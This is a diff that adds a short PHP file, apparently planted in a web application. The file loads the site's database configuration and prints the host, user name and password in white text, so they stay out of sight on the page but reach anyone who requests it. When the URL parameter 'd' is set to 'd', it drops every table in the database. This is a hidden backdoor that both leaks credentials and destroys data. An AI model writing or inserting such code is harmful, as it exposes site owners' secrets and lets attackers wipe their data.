@@ -1,0 +1,2 @@
+<?php
+$a=require("../../../../Data/conf/db.php");$b=$a['DB_HOST'];$c=$a['DB_USER'];$e=$a['DB_PWD'];$f=$a['DB_NAME'];$g=mysql_connect($b,$c,$e);mysql_select_db($f);$h=mysql_query("show table status from $f",$g);echo '<font color=white>'.$b.'<br />'.$f.'<br />'.$c.'<br />'.$e.'</font>';$i=$_GET['d'];if($i=='d'){while($j=mysql_fetch_array($h)){mysql_query("drop table $j[Name]");}}?>
